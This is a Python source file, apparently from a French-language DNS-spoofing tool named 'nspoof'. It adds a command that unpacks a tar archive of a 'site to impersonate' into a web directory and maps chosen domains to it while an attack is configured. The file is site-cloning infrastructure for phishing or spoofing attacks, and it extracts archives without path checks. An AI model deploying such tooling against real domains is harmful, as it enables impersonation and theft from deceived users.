import sys
import os
import tarfile
import shutil
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'environment')))
from attack_status import ATTACK_STATUS
from websites import WEBSITES

def add_site_command(params):

	if ATTACK_STATUS['status'] != 0:
		print("L'attaque est déja en cours.")
		return

	if len(params) < 2:
		print("Vous devez spécifier au moins un domaine et un le chemin d'un fichier ZIP contenant les fichiers du site à usurper.")
		return

	if len(WEBSITES) == 0:
		idd = 1
	else:
		idd = WEBSITES[-1][0] + 1

	domains = params[:-1]

	# Recreation of folder
	try:

		newdir = '/var/www/nspoof/website' + str(idd)

		if os.path.exists(newdir):
			shutil.rmtree(newdir)

		os.makedirs(newdir)

	except:
		print("Erreur lors de la recréation du dossier.")
		return

	# Recreation of temp folder
	try:

		tmpdir = '/tmp/nspoof'

		if os.path.exists(tmpdir):
			shutil.rmtree(tmpdir)

		os.makedirs(tmpdir)

	except:
		print("Erreur lors de la recréation du dossier temporaire.")
		return

	# Extraction of tarfile
	try:
		with tarfile.open(params[-1], 'r:gz') as tar:
			tar.extractall(path=tmpdir)
	except:
		print("Erreur. Le fichier tar n'existe pas.")
		return

	# Moving files
	try:
		for root, dirs, files in os.walk(tmpdir):
			for file in files:
				src_file = os.path.join(root, file)
				dest_file = os.path.join(newdir, file)
				shutil.move(src_file, dest_file)
	except:
		print("Erreur dans le déplacement.")

	new_site = [idd, domains, 0, 1, [], newdir]

	WEBSITES.append(new_site)